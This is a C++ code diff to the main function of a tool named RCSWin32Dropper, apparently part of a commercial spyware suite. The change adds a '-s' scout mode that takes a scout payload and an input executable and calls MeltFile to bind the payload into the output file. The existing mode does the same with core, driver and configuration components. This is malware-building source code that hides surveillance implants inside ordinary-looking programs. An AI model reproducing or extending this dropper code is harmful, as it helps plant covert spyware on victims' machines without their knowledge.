@@ -30,7 +30,51 @@ int main(int argc, char* argv[])
 	
 	memset(&MS, 0, sizeof(MelterStruct));
 	MS.manifest = false;
-	
+
+	if (argc < 2)
+	{
+		printf("Need moar options\n");
+		return 0;
+	}
+
+	if (!strcmp(argv[1], "-s"))			// SCOUT SCOUT SCOUT
+	{
+		if (argc != 5)
+		{
+			printf("usage: RCSWin32Dropper.exe -s <scout> <input> <output>\n");
+			return 0;
+		}
+		printf("Cooking for scout\n");
+
+		char *scoutFile = argv[2];
+		char *inputFile = argv[3];
+		char *outputFile = argv[4];
+
+		try
+		{
+
+			printf("Input file is %s, input: %s, output: %s\n", scoutFile, inputFile, outputFile);
+
+			sprintf(MS.core, "%s", scoutFile);
+			int ret = MeltFile( inputFile, outputFile, &MS, TRUE, scoutFile );
+		}
+		catch (melting_error &e) 
+		{
+			cout << e.what() << endl;
+			bf::remove(outputFile);
+			return ERROR_OUTPUT;
+		}
+		catch (...) 
+		{
+			cout << "UNEXPECTED EXCEPTION!" << endl;
+			bf::remove(outputFile);
+			return ERROR_OUTPUT;
+		}
+
+
+
+		return 0;
+	}
 	if (argc != 13) {
 		printf("ERROR: \n");
 		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <prefix> <demo_bitmap> <input> <output>\n\n");
@@ -192,8 +236,9 @@ int main(int argc, char* argv[])
 		int ret = MeltFile(
 		exeFile.string().c_str(),
 		outputFile.string().c_str(),
-		&MS
-		);
+		&MS,
+		FALSE,
+		NULL);
 	} catch (melting_error &e) {
 		cout << e.what() << endl;
 		bf::remove(outputFile);
